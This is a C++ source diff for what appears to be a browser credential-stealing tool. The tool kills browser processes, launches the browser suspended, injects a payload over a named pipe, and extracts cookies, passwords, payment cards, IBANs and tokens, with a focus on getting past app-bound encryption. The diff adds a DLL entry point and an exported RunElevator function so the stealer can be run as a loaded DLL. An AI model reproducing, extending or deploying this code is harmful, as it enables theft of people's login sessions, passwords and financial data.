@@ -10,6 +10,7 @@
 #include "pipe_server.hpp"
 #include "injector.hpp"
 #include <iostream>
+#include <shellapi.h>
 
 using namespace Injector;
 
@@ -20,74 +21,20 @@ struct GlobalStats {
 };
 
 void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, bool killFirst,
-                    const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats) {
-    
-    console.BrowserHeader(browser.displayName, browser.version);
+                    const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats);
 
-    try {
-        if (killFirst) {
-            console.Debug("Terminating browser processes...");
-            
-            BrowserTerminator terminator(console);
-            TerminationOptions opts;
-            opts.terminateChildren = true;
-            opts.waitForExit = true;
-            
-            auto termStats = terminator.KillByExeName(browser.exeName, opts);
-            if (termStats.processesTerminated > 0) {
-                std::string pidList;
-                for (size_t i = 0; i < termStats.terminatedPids.size(); ++i) {
-                    if (i > 0) pidList += ", ";
-                    pidList += std::to_string(termStats.terminatedPids[i]);
-                }
-                console.Debug("  [+] Processes terminated (PID: " + pidList + ")");
-            } else {
-                console.Debug("  [+] No running processes found");
-            }
-            Sleep(300);
-        }
-
-        console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
-        ProcessManager procMgr(browser);
-        procMgr.CreateSuspended();
-        console.Debug("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");
-
-        PipeServer pipe(browser.type);
-        pipe.Create();
-        console.Debug("  [+] IPC pipe established: " + Core::ToUtf8(pipe.GetName()));
-
-        PayloadInjector injector(procMgr, console);
-        injector.Inject(pipe.GetName());
-
-        console.Debug("Awaiting payload connection...");
-        pipe.WaitForClient();
-        console.Debug("  [+] Payload connected");
-        
-        pipe.SendConfig(verbose, fingerprint, output);
-        pipe.ProcessMessages(verbose);
-        
-        auto pStats = pipe.GetStats();
-        if (pStats.noAbe) {
-            // ABE not enabled - not a failure, just skip
-            stats.skipped++;
-        } else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
-            console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans, pStats.tokens,
-                           pStats.profiles, (output / browser.displayName).string());
-            stats.successful++;
-        } else {
-            console.Warn("No data extracted");
-            stats.failed++;
-        }
-        
-        procMgr.Terminate();
-
-    } catch (const std::exception& e) {
-        console.Error(std::string(e.what()));
-        stats.failed++;
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            DisableThreadLibraryCalls(hModule);
+            break;
+        default:
+            break;
     }
+    return TRUE;
 }
 
-int wmain(int argc, wchar_t* argv[]) {
+static int ElevatorMain(int argc, wchar_t* argv[]) {
     bool verbose = false;
     bool fingerprint = false;
     bool killBrowsers = false;
@@ -96,7 +43,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
     Core::Console console(false);
 
-    for (int i = 1; i < argc; ++i) {
+    for (int i = 0; i < argc; ++i) {
         std::wstring arg = argv[i];
         if (arg == L"--verbose" || arg == L"-v") verbose = true;
         else if (arg == L"--fingerprint" || arg == L"-f") fingerprint = true;
@@ -157,3 +104,114 @@ int wmain(int argc, wchar_t* argv[]) {
 
     return 0;
 }
+
+extern "C" __declspec(dllexport) void CALLBACK RunElevator(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
+        AllocConsole();
+    }
+
+    FILE* dummy = nullptr;
+    freopen_s(&dummy, "CONOUT$", "w", stdout);
+    freopen_s(&dummy, "CONOUT$", "w", stderr);
+    freopen_s(&dummy, "CONIN$", "r", stdin);
+
+    std::wstring wCommandLine;
+    if (lpszCmdLine && *lpszCmdLine) {
+        int len = MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, nullptr, 0);
+        if (len > 0) {
+            wCommandLine.resize(len);
+            MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, wCommandLine.data(), len);
+            if (!wCommandLine.empty() && wCommandLine.back() == L'\0') {
+                wCommandLine.pop_back();
+            }
+        }
+    }
+
+    int argc = 0;
+    LPWSTR* argv = nullptr;
+    if (!wCommandLine.empty()) {
+        argv = CommandLineToArgvW(wCommandLine.c_str(), &argc);
+    }
+
+    if (argv) {
+        ElevatorMain(argc, argv);
+        LocalFree(argv);
+    } else {
+        ElevatorMain(0, nullptr);
+    }
+}
+
+int wmain(int argc, wchar_t* argv[]) {
+    if (argc > 0) {
+        return ElevatorMain(argc - 1, argv + 1);
+    }
+    return ElevatorMain(0, nullptr);
+}
+
+void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, bool killFirst,
+                    const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats) {
+    
+    console.BrowserHeader(browser.displayName, browser.version);
+
+    try {
+        if (killFirst) {
+            console.Debug("Terminating browser processes...");
+            
+            BrowserTerminator terminator(console);
+            TerminationOptions opts;
+            opts.terminateChildren = true;
+            opts.waitForExit = true;
+            
+            auto termStats = terminator.KillByExeName(browser.exeName, opts);
+            if (termStats.processesTerminated > 0) {
+                std::string pidList;
+                for (size_t i = 0; i < termStats.terminatedPids.size(); ++i) {
+                    if (i > 0) pidList += ", ";
+                    pidList += std::to_string(termStats.terminatedPids[i]);
+                }
+                console.Debug("  [+] Processes terminated (PID: " + pidList + ")");
+            } else {
+                console.Debug("  [+] No running processes found");
+            }
+            Sleep(300);
+        }
+
+        console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
+        ProcessManager procMgr(browser);
+        procMgr.CreateSuspended();
+        console.Debug("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");
+
+        PipeServer pipe(browser.type);
+        pipe.Create();
+        console.Debug("  [+] IPC pipe established: " + Core::ToUtf8(pipe.GetName()));
+
+        PayloadInjector injector(procMgr, console);
+        injector.Inject(pipe.GetName());
+
+        console.Debug("Awaiting payload connection...");
+        pipe.WaitForClient();
+        console.Debug("  [+] Payload connected");
+        
+        pipe.SendConfig(verbose, fingerprint, output);
+        pipe.ProcessMessages(verbose);
+        
+        auto pStats = pipe.GetStats();
+        if (pStats.noAbe) {
+            stats.skipped++;
+        } else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
+            console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans, pStats.tokens,
+                           pStats.profiles, (output / browser.displayName).string());
+            stats.successful++;
+        } else {
+            console.Warn("No data extracted");
+            stats.failed++;
+        }
+        
+        procMgr.Terminate();
+
+    } catch (const std::exception& e) {
+        console.Error(std::string(e.what()));
+        stats.failed++;
+    }
+}
+    
